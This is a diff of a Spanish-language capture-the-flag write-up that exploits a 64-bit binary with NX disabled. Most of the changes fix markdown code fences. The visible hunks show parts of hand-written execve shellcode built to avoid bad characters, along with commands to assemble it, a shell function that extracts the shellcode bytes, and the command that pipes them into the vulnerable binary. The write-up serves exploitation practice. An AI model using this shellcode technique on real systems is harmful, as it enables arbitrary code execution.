@@ -1,15 +1,15 @@
 ## Analisis del Binario
 Tenemos un binario ejecutable de 64 bits con el NX desabilitado.
 
-![foto de el binario](/images/bin.png)
+![foto de el binario](/images/checksec.png)
 
 Al ejecutar el binario nos recibe con el siguiente mensaje, donde dependiendo nuestra respuesta se acontece un segmentation fault.
 
-'''
+```
 Hey, just because I am hungry doesn't mean I'll execute everything
 asd
 Hehe, told you... won't accept everything
-'''
+```
 
 ## Analisis del Codigo
 
@@ -26,7 +26,7 @@ limitantes que nos ocasiona la estructura del codigo hace dificil el uso de herr
 
 Como estamos en presencia de un binario de 64 bits, nuestro objetivo sera leer el archivo flag.txt, vamos a crearlo.
 
-'''asm
+```asm
 section .text
     global _start
 
@@ -64,27 +64,28 @@ _start:
     mov al, 60              ; RAX -> execv cuyo valor es [59]
     dec al
     syscall
-'''
+```
 
 *Nota: Puedes descargar el archivo sin comentarios [aqui](/exploit/shellcode.asm)*
 
 Una vez listo, debemos ver si no contiene Null bytes y ninguno de los badchars (si seguiste la guia puedes seguir con normalidad).
 Compilamos el binario con los siguientes comandos:
-'''bash
+
+```bash
 nasm -f elf64 <filename> -o shellcode.o
 ld shellcode.o -o shell
-'''
+```
 Lo ejecutamos para comprobar que todo este bien...
 
 # Generacion del shellcode
 Gracias a la siguiente funcion que tengo programada en mi zshrc se puede exctraer el shell code con facilidad.
 
-'''bash
+```bash
 extractShell () {
 	printf '\\x' && objdump -d $1 | grep "^ " | cut -f2 | xargs | tr -d " " | sed 's/.\{2\}/&\\x/g' | head -c-3
 	echo
 }
-'''
+```
 Lo copiamos y vamos a la explotacion.
 
 *Puedes agregarlo a tu zsh en la ultima linea*
@@ -92,9 +93,9 @@ Lo copiamos y vamos a la explotacion.
 # Explotacion
 Una vez tengamos el shellcode debemos explotar el binario.
 
-'''
+```bash
 echo -n <shellcode> | ./execute
-'''
+```
 
 ![flag](images/flag.png)
 
